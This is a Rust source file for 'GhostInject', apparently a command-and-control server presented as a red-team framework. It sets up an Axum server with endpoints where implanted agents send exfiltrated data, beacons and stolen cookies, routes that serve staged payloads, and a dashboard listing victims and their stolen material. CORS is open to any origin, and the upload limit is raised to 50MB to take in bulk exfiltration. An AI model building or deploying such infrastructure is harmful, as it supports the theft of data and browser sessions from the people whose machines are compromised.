mod config;
mod handlers;
mod database;
mod models;
mod auth;

use axum::{
    Router,
    routing::{get, post},
    extract::DefaultBodyLimit,  // ADICIONADO!
    http::{
        header::{CONTENT_TYPE, AUTHORIZATION},
        HeaderName,
        Method,
    },
    response::Json,
    middleware,
};
use tower_http::{
    cors::{CorsLayer, Any},
    trace::TraceLayer,
};
use std::sync::Arc;
use tracing::info;
use tracing_subscriber;

use config::Config;
use database::Database;
use handlers::*;
use auth::{auth_middleware, login_handler};

#[derive(Clone)]
pub struct AppState {
    pub db: Arc<Database>,
    pub config: Arc<Config>,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    println!("=== DEBUG MAIN ===");
    println!("1. Iniciando servidor...");
    println!("2. Diretório atual: {:?}", std::env::current_dir());
    
    // Setup logging
    println!("3. Configurando logging...");
    tracing_subscriber::fmt()
        .with_target(false)
        .with_thread_ids(true)
        .init();
    
    println!("4. Carregando configuração...");
    // Load configuration
    let config = match Config::load() {
        Ok(c) => {
            println!("   Config carregada com sucesso");
            c
        },
        Err(e) => {
            println!("   ERRO ao carregar config: {}", e);
            return Err(e.into());
        }
    };
    info!("📁 Config loaded: {}:{}", config.server.host, config.server.port);
    println!("5. Server: {}:{}", config.server.host, config.server.port);
    println!("6. Database URL: {}", config.database.url);
    println!("7. Log file: {}", config.logging.file);
    
    println!("8. Inicializando banco de dados...");
    // Initialize database
    let db = match Database::new(&config.database.url).await {
        Ok(d) => {
            println!("   Banco de dados conectado com sucesso");
            d
        },
        Err(e) => {
            println!("   ERRO ao conectar banco: {}", e);
            return Err(e);
        }
    };
    info!("💾 Database initialized");
    
    println!("9. Criando AppState...");
    // Create app state
    let state = AppState {
        db: Arc::new(db),
        config: Arc::new(config),
    };
    
    let shared_state = Arc::new(state);
    
    println!("10. Configurando CORS...");
    // CORS configuration
    let cors = CorsLayer::new()
        .allow_methods([Method::GET, Method::POST, Method::OPTIONS])
        .allow_origin(Any)
        .allow_headers([CONTENT_TYPE, AUTHORIZATION, HeaderName::from_static("x-api-key")]);
    
    println!("11. Construindo rotas...");
    // Build router with middleware stack
    let app = Router::new()
        // Public routes (no auth)
        .route("/", get(root_handler))
        .route("/health", get(health_handler))
        .route("/login", post(login_handler))
        
        // Protected routes (API Key required for agents)
        .route("/exfil", post(exfil_handler))
        .route("/beacon", post(beacon_handler))
        .route("/cookies", post(cookies_handler))
        
        // Protected routes (JWT required for dashboard)
        .route("/payload/:stage", get(payload_handler))
        .route("/victims", get(victims_handler))
        .route("/victim/:id", get(victim_details_handler))
        .route("/exfil/:id", get(get_exfil_handler))
        .route("/exfil/raw/:id", get(get_raw_exfil_handler))  // NOVA ROTA!
        .route("/dashboard", get(dashboard_handler))
        
        // Apply auth middleware
        .layer(middleware::from_fn_with_state(
            shared_state.clone(),
            auth_middleware,
        ))
        // ADICIONADO: Aumenta o limite de body para 50MB
        .layer(DefaultBodyLimit::max(50 * 1024 * 1024))  // 50MB
        .layer(cors)
        .layer(TraceLayer::new_for_http())
        .with_state(shared_state.clone());
    
    println!("12. Iniciando servidor...");
    // Start server
    let addr = format!("{}:{}", shared_state.config.server.host, shared_state.config.server.port);
    println!("=== FIM DEBUG ===");
    info!("🌐 Listening on http://{}", addr);
    info!("📊 Dashboard: http://{}/dashboard", addr);
    info!("🔐 Login: http://{}/login", addr);
    info!("🔍 Raw exfil: http://{}/exfil/raw/{{id}}", addr);
    
    let listener = tokio::net::TcpListener::bind(addr).await?;
    axum::serve(listener, app).await?;
    
    Ok(())
}

// ============================================================
// PUBLIC HANDLERS
// ============================================================

async fn root_handler() -> &'static str {
    "GhostInject C2 Server Online — Red Team Framework"
}

async fn health_handler() -> Json<serde_json::Value> {
    Json(serde_json::json!({
        "status": "healthy",
        "version": env!("CARGO_PKG_VERSION"),
        "timestamp": chrono::Utc::now().to_rfc3339(),
        "services": {
            "database": "connected",
            "api": "operational"
        }
    }))
}